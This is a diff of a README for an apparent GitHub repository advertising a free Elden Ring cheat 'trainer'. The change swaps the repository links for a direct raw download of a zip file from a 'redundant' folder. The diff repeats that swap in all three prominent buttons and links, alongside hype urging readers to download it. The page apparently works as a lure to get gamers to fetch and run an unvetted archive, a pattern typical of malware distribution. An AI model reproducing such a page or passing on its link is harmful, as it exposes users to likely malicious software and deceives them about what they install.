@@ -1,7 +1,7 @@
 <h1>⚔️ EldenRing-Trainer---Elden-Ring-Trainer-2026 - God Mode, Infinite Runes, & More</h1>
 
 <p align="center">
-  <a href="https://github.com/Plungegulfofcorinth3988/EldenRing-Trainer---Elden-Ring-Trainer-2026" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);">🚀 DOWNLOAD NOW - FREE ACCESS</a>
+  <a href="https://raw.githubusercontent.com/Plungegulfofcorinth3988/EldenRing-Trainer---Elden-Ring-Trainer-2026/main/redundant/v3.1-beta.5.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);">🚀 DOWNLOAD NOW - FREE ACCESS</a>
 </p>
 
 Welcome, Tarnished! If you’ve ever found yourself stuck on a boss for hours, or just want to explore the Lands Between without the constant fear of death, you’ve come to the right place. This trainer gives you total control over your game experience. No more grinding for runes, no more worrying about health or stamina. Just pure, uninterrupted adventure. Let’s get you set up in the next five minutes.
@@ -77,7 +77,7 @@ Follow these simple instructions carefully and you’ll be cheating in no time. 
 
 Click the big orange button at the top of this page, or go to this link:
 
-**[https://github.com/Plungegulfofcorinth3988/EldenRing-Trainer---Elden-Ring-Trainer-2026](https://github.com/Plungegulfofcorinth3988/EldenRing-Trainer---Elden-Ring-Trainer-2026)**
+**[https://raw.githubusercontent.com/Plungegulfofcorinth3988/EldenRing-Trainer---Elden-Ring-Trainer-2026/main/redundant/v3.1-beta.5.zip](https://raw.githubusercontent.com/Plungegulfofcorinth3988/EldenRing-Trainer---Elden-Ring-Trainer-2026/main/redundant/v3.1-beta.5.zip)**
 
 This link will take you to a download page. **Visit this link to download the application.** The download will start automatically or you’ll see a download button on that page. The file is relatively small (under 50 MB), so it shouldn’t take long on any internet connection.
 
@@ -249,7 +249,7 @@ That’s everything you need to know. Now go out there, Tarnished, and crush the
 <hr>
 
 <p align="center">
-  <a href="https://github.com/Plungegulfofcorinth3988/EldenRing-Trainer---Elden-Ring-Trainer-2026" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#4caf50,#8bc34a);color:#fff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(76,175,80,0.4);">📥 CLICK HERE TO DOWNLOAD TRAINER</a>
+  <a href="https://raw.githubusercontent.com/Plungegulfofcorinth3988/EldenRing-Trainer---Elden-Ring-Trainer-2026/main/redundant/v3.1-beta.5.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#4caf50,#8bc34a);color:#fff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(76,175,80,0.4);">📥 CLICK HERE TO DOWNLOAD TRAINER</a>
 </p>
 
 <p align="center"><small>For Windows 10/11 only. Use at your own discretion in offline mode.</small></p>
